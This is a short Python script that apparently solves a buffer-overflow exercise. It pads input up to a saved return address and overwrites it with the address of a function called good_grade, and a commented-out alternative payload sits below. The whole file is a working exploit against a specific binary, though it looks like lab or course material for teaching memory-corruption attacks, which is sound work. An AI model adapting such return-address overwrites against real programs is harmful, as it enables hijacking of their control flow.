input = 0xbffed1bc
ebp = 0xbffed1c8
good_grade = 0x08048efe

# We want to overflow the return address by writing address of good_grade to return address.
from struct import pack
print "\x00"*(ebp - input + 4) + pack ("<I", good_grade)
# print "a"*16 + "\xFE\x8E\x04\x08"
